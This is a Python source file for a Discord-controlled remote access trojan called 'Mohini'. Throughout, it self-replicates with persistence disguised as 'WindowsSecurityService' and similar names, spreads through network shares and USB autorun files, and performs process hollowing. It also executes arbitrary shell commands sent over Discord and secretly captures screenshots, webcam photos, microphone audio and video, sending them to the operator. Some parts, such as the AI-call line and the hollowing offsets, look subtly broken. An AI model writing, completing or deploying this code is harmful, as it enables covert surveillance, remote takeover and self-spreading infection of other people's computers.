import discord
import json
import subprocess
import cv2
import mss
import sounddevice as sd
import numpy as np
import wave
import os
import shutil
import time, socket, getpass
import asyncio
import ctypes
import platform
import sys
from datetime import datetime
from discord.ext import commands
from PIL import Image
from textblob import TextBlob
import google.generativeai as genai

# Load configuration from config.json
with open("Folder/config.json", "r") as config_file:
    config = json.load(config_file)

TOKEN = config["TOKEN"]
GEMINI_API_KEY = config["GEMINI_API_KEY"]

# Initialize Gemini API
genai.configure(api_key=GEMINI_API_KEY)

# Enable intents for message handling
intents = discord.Intents.default()
intents.message_content = True

# Create bot instance
bot = commands.Bot(command_prefix="!", intents=intents)

# Directory to store temporary files
TEMP_DIR = "Mohini_temp"
os.makedirs(TEMP_DIR, exist_ok=True)

# Self Replication Implementation
class SelfReplicator:
    def __init__(self):
        self.system = platform.system()
        self.current_path = os.path.abspath(sys.argv[0])
        self.filename = os.path.basename(self.current_path)
        
    def replicate(self, target_paths=None):
        if target_paths is None:
            target_paths = self._get_default_target_paths()
        success_count = 0
        failed_paths = []
        error_messages = []
        
        for path in target_paths:
            try:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                shutil.copy2(self.current_path, path)
                if self._setup_persistence(path):
                    success_count += 1
                else:
                    failed_paths.append(path)
            except Exception as e:
                failed_paths.append(path)
                error_messages.append(f"Failed to replicate to {path}: {str(e)}")
        return success_count, failed_paths, error_messages
    
    def _get_default_target_paths(self):
        paths = []
        if self.system == "Windows":
            username = getpass.getuser()
            paths = [
                os.path.join(os.environ.get('APPDATA', ''), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", self.filename),
                os.path.join(os.environ.get('LOCALAPPDATA', ''), "Temp", self.filename),
                os.path.join("C:\\Users", username, "Documents", self.filename),
                os.path.join("C:\\ProgramData", "Microsoft", "Windows", "Start Menu", "Programs", self.filename)
            ] 
        elif self.system == "Linux":
            home = os.path.expanduser("~")
            paths = [
                os.path.join(home, ".config", "autostart", self.filename),
                os.path.join(home, ".local", "bin", self.filename),
                os.path.join("/tmp", self.filename),
                os.path.join(home, ".cache", self.filename)
            ]
        elif self.system == "Darwin":  # macOS
            home = os.path.expanduser("~")
            paths = [
                os.path.join(home, "Library", "LaunchAgents", f"com.{self.filename}.plist"),
                os.path.join(home, "Library", "Application Support", self.filename),
                os.path.join("/tmp", self.filename),
                os.path.join(home, "Downloads", self.filename)
            ]
        return paths
    
    def _setup_persistence(self, path):
        try:
            if self.system == "Windows":
                import winreg
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(key, "WindowsSecurityService", 0, winreg.REG_SZ, path)
                    winreg.CloseKey(key)
                    return True
                except Exception:
                    task_name = "WindowsSecurityUpdate"
                    cmd = f'schtasks /create /tn "{task_name}" /tr "{path}" /sc onlogon /rl highest /f'
                    subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    return True
            
            elif self.system == "Linux":
                if ".config/autostart" in path:
                    desktop_file = path.replace(self.filename, f"{self.filename}.desktop")
                    with open(desktop_file, "w") as f:
                        f.write(f"""[Desktop Entry]
Type=Application
Name=System Security Service
Exec={path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
                    os.chmod(desktop_file, 0o755)
                try:
                    cron_cmd = f"@reboot {path}"
                    subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', 
                                  shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                except Exception:
                    pass
                os.chmod(path, 0o755)
                return True
            elif self.system == "Darwin":
                if "LaunchAgents" in path:
                    plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.security.service</string>
    <key>ProgramArguments</key>
    <array>
        <string>{path.replace('.plist', '')}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
                    with open(path, "w") as f:
                        f.write(plist_content)
                    subprocess.run(f"launchctl load {path}", shell=True, 
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                executable_path = path.replace('.plist', '')
                if os.path.exists(executable_path):
                    os.chmod(executable_path, 0o755)
                return True
            return False
        except Exception:
            return False
    
    def create_network_spreader(self, network_paths=None):
        if network_paths is None:
            network_paths = self._discover_network_shares()
        success_count = 0
        failed_paths = []
        for path in network_paths:
            try:
                full_path = os.path.join(path, self.filename)
                shutil.copy2(self.current_path, full_path)
                if self.system == "Windows":
                    autorun_path = os.path.join(path, "autorun.inf")
                    with open(autorun_path, "w") as f:
                        f.write(f"""[autorun]
open={self.filename}
action=Open Folder and Run Security Scan
""")
                success_count += 1
            except Exception:
                failed_paths.append(path)
        return success_count, failed_paths
    
    def _discover_network_shares(self):
        discovered_shares = []
        if self.system == "Windows":
            try:
                output = subprocess.check_output("net view", shell=True, text=True)
                lines = output.split('\n')
                for line in lines:
                    if '\\\\' in line:
                        share = line.split()[0]
                        discovered_shares.append(share)
            except Exception:
                pass
        elif self.system in ["Linux", "Darwin"]:
            try:
                with open('/etc/mtab', 'r') as f:
                    for line in f:
                        if 'cifs' in line or 'smbfs' in line:
                            parts = line.split()
                            if len(parts) > 1:
                                discovered_shares.append(parts[1])
            except Exception:
                pass
        return discovered_shares
    
    def create_usb_spreader(self):
        try:
            import threading
            def monitor_drives():
                known_drives = set()
                while True:
                    current_drives = set()
                    
                    if self.system == "Windows":
                        import string
                        for drive in string.ascii_uppercase:
                            if os.path.exists(f"{drive}:\\"):
                                current_drives.add(f"{drive}:\\")
                    
                    elif self.system == "Linux":
                        # Check /media directory for mounted drives
                        for user_dir in os.listdir("/media"):
                            user_path = os.path.join("/media", user_dir)
                            if os.path.isdir(user_path):
                                for drive in os.listdir(user_path):
                                    drive_path = os.path.join(user_path, drive)
                                    if os.path.isdir(drive_path):
                                        current_drives.add(drive_path)
                    
                    elif self.system == "Darwin":
                        for drive in os.listdir("/Volumes"):
                            drive_path = os.path.join("/Volumes", drive)
                            if os.path.isdir(drive_path):
                                current_drives.add(drive_path)
                    new_drives = current_drives - known_drives
                    for drive in new_drives:
                        try:
                            target_path = os.path.join(drive, self.filename)
                            shutil.copy2(self.current_path, target_path)
                            if self.system == "Windows":
                                autorun_path = os.path.join(drive, "autorun.inf")
                                with open(autorun_path, "w") as f:
                                    f.write(f"""[autorun]
open={self.filename}
action=Open Drive and Run Security Scan
""")
                        except Exception:
                            pass
                    known_drives = current_drives
                    time.sleep(5)
            monitor_thread = threading.Thread(target=monitor_drives, daemon=True)
            monitor_thread.start()
            return True
        
        except Exception:
            return False
        
class ProcessHollowing:
    def __init__(self):
        self.system = platform.system()
        
    def hollow_process(self, target_process, payload_path):
        try:
            if self.system == "Windows":
                return self._hollow_windows(target_process, payload_path)
            elif self.system == "Linux":
                return self._hollow_linux(target_process, payload_path)
            else:
                return False, f"Unsupported operating system: {self.system}"
        except Exception as e:
            return False, f"Process hollowing failed: {str(e)}"
    
    def _hollow_windows(self, target_process, payload_path):
        """Windows-specific process hollowing implementation"""
        try:
            kernel32 = ctypes.windll.kernel32
            with open(payload_path, 'rb') as f:
                payload_data = f.read()
            CREATE_SUSPENDED = 0x00000004
            MEM_COMMIT = 0x00001000
            MEM_RESERVE = 0x00002000
            PAGE_EXECUTE_READWRITE = 0x40
            startup_info = ctypes.create_string_buffer(68)
            process_info = ctypes.create_string_buffer(24)
            if not kernel32.CreateProcessA(
                target_process.encode(),
                None,
                None,
                None,
                False,
                CREATE_SUSPENDED,
                None,
                None,
                startup_info,
                process_info
            ):
                return False, f"Failed to create process: {kernel32.GetLastError()}"
            process_handle = int.from_bytes(process_info[8:12], byteorder='little')
            thread_handle = int.from_bytes(process_info[12:16], byteorder='little')
            context = ctypes.create_string_buffer(716)  # Size of CONTEXT structure
            context[0:4] = (0x10007).to_bytes(4, byteorder='little')  # CONTEXT_FULL flag
            if not kernel32.GetThreadContext(thread_handle, context):
                return False, "Failed to get thread context"
            peb_address = int.from_bytes(context[88:92], byteorder='little')  # Ebx register points to PEB
            image_base_buffer = ctypes.create_string_buffer(4)
            bytes_read = ctypes.c_ulong(0)
            if not kernel32.ReadProcessMemory(
                process_handle,
                peb_address + 8,  # Offset to ImageBaseAddress in PEB
                image_base_buffer,
                4,
                ctypes.byref(bytes_read)
            ):
                return False, "Failed to read image base address"
            
            image_base = int.from_bytes(image_base_buffer, byteorder='little')
            
            # Unmap the original executable
            ntdll = ctypes.windll.ntdll
            if ntdll.NtUnmapViewOfSection(process_handle, image_base) != 0:
                return False, "Failed to unmap original executable"
            
            # Allocate memory for the payload
            new_image_base = kernel32.VirtualAllocEx(
                process_handle,
                image_base,
                len(payload_data),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            
            if not new_image_base:
                return False, "Failed to allocate memory for payload"
            
            # Write payload to the process memory
            if not kernel32.WriteProcessMemory(
                process_handle,
                new_image_base,
                payload_data,
                len(payload_data),
                ctypes.byref(bytes_read)
            ):
                return False, "Failed to write payload to process memory"
            if not kernel32.WriteProcessMemory(
                process_handle,
                peb_address + 8,
                image_base.to_bytes(4, byteorder='little'),
                4,
                ctypes.byref(bytes_read)
            ):
                return False, "Failed to update image base in PEB"
            entry_point = image_base + 0x100
            context[176:180] = entry_point.to_bytes(4, byteorder='little')
            if not kernel32.SetThreadContext(thread_handle, context):
                return False, "Failed to set thread context"
            if kernel32.ResumeThread(thread_handle) == -1:
                return False, "Failed to resume thread"
            kernel32.CloseHandle(process_handle)
            kernel32.CloseHandle(thread_handle)
            return True, "Process hollowing successful on Windows"
        except Exception as e:
            return False, f"Windows process hollowing failed: {str(e)}"
    
    def _hollow_linux(self, target_process, payload_path):
        """Linux-specific process hollowing implementation"""
        try:
            libc = ctypes.CDLL("libc.so.6")
            PTRACE_TRACEME = 0
            PTRACE_ATTACH = 16
            PTRACE_DETACH = 17
            PTRACE_GETREGS = 12
            PTRACE_SETREGS = 13
            PTRACE_POKETEXT = 4
            pid = os.fork()
            if pid == 0:
                libc.ptrace(PTRACE_TRACEME, 0, 0, 0)
                os.execl(target_process, target_process)
                os._exit(1)
            _, status = os.waitpid(pid, 0)
            with open(payload_path, 'rb') as f:
                payload_data = f.read()
            class user_regs_struct(ctypes.Structure):
                _fields_ = [
                    ("r15", ctypes.c_ulonglong),
                    ("r14", ctypes.c_ulonglong),
                    ("r13", ctypes.c_ulonglong),
                    ("r12", ctypes.c_ulonglong),
                    ("rbp", ctypes.c_ulonglong),
                    ("rbx", ctypes.c_ulonglong),
                    ("r11", ctypes.c_ulonglong),
                    ("r10", ctypes.c_ulonglong),
                    ("r9", ctypes.c_ulonglong),
                    ("r8", ctypes.c_ulonglong),
                    ("rax", ctypes.c_ulonglong),
                    ("rcx", ctypes.c_ulonglong),
                    ("rdx", ctypes.c_ulonglong),
                    ("rsi", ctypes.c_ulonglong),
                    ("rdi", ctypes.c_ulonglong),
                    ("orig_rax", ctypes.c_ulonglong),
                    ("rip", ctypes.c_ulonglong),
                    ("cs", ctypes.c_ulonglong),
                    ("eflags", ctypes.c_ulonglong),
                    ("rsp", ctypes.c_ulonglong),
                    ("ss", ctypes.c_ulonglong),
                    ("fs_base", ctypes.c_ulonglong),
                    ("gs_base", ctypes.c_ulonglong),
                    ("ds", ctypes.c_ulonglong),
                    ("es", ctypes.c_ulonglong),
                    ("fs", ctypes.c_ulonglong),
                    ("gs", ctypes.c_ulonglong),
                ]
            regs = user_regs_struct()
            if libc.ptrace(PTRACE_GETREGS, pid, 0, ctypes.byref(regs)) != 0:
                return False, "Failed to get registers"
            for i in range(0, len(payload_data), 8):
                chunk = payload_data[i:min(i+8, len(payload_data))]
                if len(chunk) < 8:
                    chunk = chunk + b'\x00' * (8 - len(chunk))
                data = int.from_bytes(chunk, byteorder='little')
                if libc.ptrace(PTRACE_POKETEXT, pid, regs.rip + i, data) != 0:
                    return False, f"Failed to write memory at offset {i}"
            if libc.ptrace(PTRACE_SETREGS, pid, 0, ctypes.byref(regs)) != 0:
                return False, "Failed to set registers"
            if libc.ptrace(PTRACE_DETACH, pid, 0, 0) != 0:
                return False, "Failed to detach from process"
            return True, f"Process hollowing successful on Linux (PID: {pid})"
        except Exception as e:
            return False, f"Linux process hollowing failed: {str(e)}"

# NLP Function for understanding commands
def get_intent(text):
    blob = TextBlob(text)
    keywords = {"screenshot": ["screenshot", "screen"],
                "camera": ["photo", "picture", "camera"],
                "record audio": ["audio", "record sound", "mic"],
                "record video": ["video", "record clip"],
                "run command": ["run", "execute", "command"],
                "ai response": ["ask", "question", "explain", "tell"],
                "process hollow": ["hollow", "inject", "replace process"]}
    
    for intent, words in keywords.items():
        if any(word in text for word in words):
            return intent
    
    return None

# Function to clean up temporary files
def cleanup_temp_files():
    if os.path.exists(TEMP_DIR):
        shutil.rmtree(TEMP_DIR)
        os.makedirs(TEMP_DIR, exist_ok=True)

# Periodic cleanup every 10 minutes
async def cleanup_task():
    while True:
        await asyncio.sleep(600)
        cleanup_temp_files()

@bot.event
async def on_ready():
    hostname = socket.gethostname()  # Get system hostname
    username = getpass.getuser()  # Get logged-in username
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Get current time
    online_message = f"🔥 **Mohini - ({hostname}) ({username}) is online at ({current_time}).** 🔥"
    for guild in bot.guilds:
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                await channel.send(online_message)
                break
    print(online_message)  # Also print it to the console
    asyncio.create_task(cleanup_task())  # Start cleanup task

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    content = message.content.lower()
    intent = get_intent(content)
    if intent == "screenshot":
        await screenshot(message.channel)
        return
    if intent == "camera":
        await camera(message.channel)
        return
    
    if intent == "record audio":
        duration = 5  # Default duration
        words = content.split()
        for i, word in enumerate(words):
            if word.isdigit():
                duration = int(word)
                break
        await record(message.channel, duration)
        return
    
    if intent == "record video":
        duration = 5  # Default duration
        words = content.split()
        for i, word in enumerate(words):
            if word.isdigit():
                duration = int(word)
                break
        await video(message.channel, duration)
        return
    
    if intent == "run command":
        command = message.content.replace("run", "").replace("execute", "").strip()
        if command:
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout if result.stdout else result.stderr
                if len(output) > 2000:
                    output = output[:1990] + "..."
                await message.channel.send(f"```{output}```")
            except Exception as e:
                await message.channel.send(f"❌ Error: {e}")
        return
    if intent == "ai response":
        response = genai.generate(content)
        await message.channel.send(response)
        return
    await bot.process_commands(message)

@bot.command()
async def screenshot(ctx_or_channel):
    try:
        filename = os.path.join(TEMP_DIR, f"screenshot_{int(time.time())}.png")
        with mss.mss() as sct:
            sct.shot(output=filename)
        await ctx_or_channel.send(file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx_or_channel.send(f"❌ Error: {e}")

@bot.command()
async def camera(ctx_or_channel):
    try:
        filename = os.path.join(TEMP_DIR, f"camera_{int(time.time())}.png")
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():  # Check if the camera is available
            await ctx_or_channel.send("❌ No **camera** is present on this system.")
            return
        ret, frame = cap.read()
        cap.release()
        if ret:
            cv2.imwrite(filename, frame)
            await ctx_or_channel.send(file=discord.File(filename))
            os.remove(filename)
        else:
            await ctx_or_channel.send("❌ Failed to capture an image.")
    except Exception as e:
        await ctx_or_channel.send(f"❌ Error: {e}")

# Record Audio for a Given Duration
@bot.command()
async def record(ctx_or_channel, duration: int = 5):
    try:
        if len(sd.query_devices()) == 0:  # Check if a microphone is available
            await ctx_or_channel.send("❌ No **microphone** is present on this system.")
            return
        filename = os.path.join(TEMP_DIR, f"recorded_audio_{int(time.time())}.wav")
        samplerate = 44100  # High-quality audio
        channels = 2  # Stereo recording
        await ctx_or_channel.send(f"🎤 **Recording audio for {duration} seconds...**")
        audio_data = sd.rec(int(samplerate * duration), samplerate=samplerate, channels=channels, dtype=np.int16)
        sd.wait()
        with wave.open(filename, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(2)
            wf.setframerate(samplerate)
            wf.writeframes(audio_data.tobytes())
        await ctx_or_channel.send(file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx_or_channel.send(f"❌ Error: {e}")

@bot.command()
async def video(ctx_or_channel, duration: int = 5):
    try:
        filename = os.path.join(TEMP_DIR, f"recorded_video_{int(time.time())}.avi")
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():  # Check if the camera is available
            await ctx_or_channel.send("❌ No **camera** is present on this system.")
            return
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
        start_time = time.time()
        while int(time.time() - start_time) < duration:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
            else:
                break
        cap.release()
        out.release()
        await ctx_or_channel.send(file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx_or_channel.send(f"❌ Error: {e}")

bot.run(TOKEN)
